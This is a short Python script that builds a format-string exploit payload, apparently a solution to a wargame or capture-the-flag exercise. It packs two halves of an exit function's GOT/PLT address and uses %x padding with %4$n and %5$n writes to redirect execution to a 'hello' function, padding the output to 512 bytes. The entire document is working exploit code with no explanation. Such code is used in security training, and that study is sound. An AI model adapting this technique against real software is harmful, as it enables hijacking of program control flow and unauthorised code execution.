import struct

HELLO = 0x080484b4
EXIT_PLT = 0x8049724

def pad(s):
    return s + "X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_PLT)
exploit += struct.pack("I", EXIT_PLT+2)
exploit += "BBBBCCCC"
exploit+= "%33956x"
exploit+="%4$n"
exploit+= "%33616x"
exploit+="%5$n"
print(pad(exploit))